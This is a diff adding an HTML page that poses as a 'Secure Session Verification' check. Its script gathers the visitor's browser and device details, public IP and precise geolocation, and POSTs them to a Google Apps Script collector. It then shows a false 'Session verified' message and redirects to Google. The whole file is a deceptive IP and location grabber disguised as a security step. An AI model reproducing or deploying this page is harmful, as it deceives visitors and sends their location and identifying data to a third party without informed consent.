@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Secure Session Verification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+  <h3>Please wait while we verify your session...</h3>
+
+  <script>
+    const data = {
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      language: navigator.language,
+      screenWidth: screen.width,
+      screenHeight: screen.height,
+      referrer: document.referrer
+    };
+
+    // Get public IP
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .then(ipData => {
+        data.ip = ipData.ip;
+
+        // Get location (if allowed)
+        navigator.geolocation.getCurrentPosition(
+          function (pos) {
+            data.latitude = pos.coords.latitude;
+            data.longitude = pos.coords.longitude;
+            data.accuracy = pos.coords.accuracy;
+            sendData();
+          },
+          function (err) {
+            data.locationError = err.message;
+            sendData();
+          }
+        );
+      });
+
+    function sendData() {
+      fetch("https://script.google.com/macros/s/AKfycbwYndUfgsQIqSSZedH-y9GZCaBSMEg7eVNxxUrHz1S3f4MvNN_PUW-nYwochdNX9NSX/exec", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data)
+      });
+
+      document.body.innerHTML = "<h3>✅ Session verified. Redirecting...</h3>";
+      setTimeout(() => {
+        window.location.href = "https://www.google.com"; // Safe redirect
+      }, 2000);
+    }
+  </script>
+</body>
+</html>
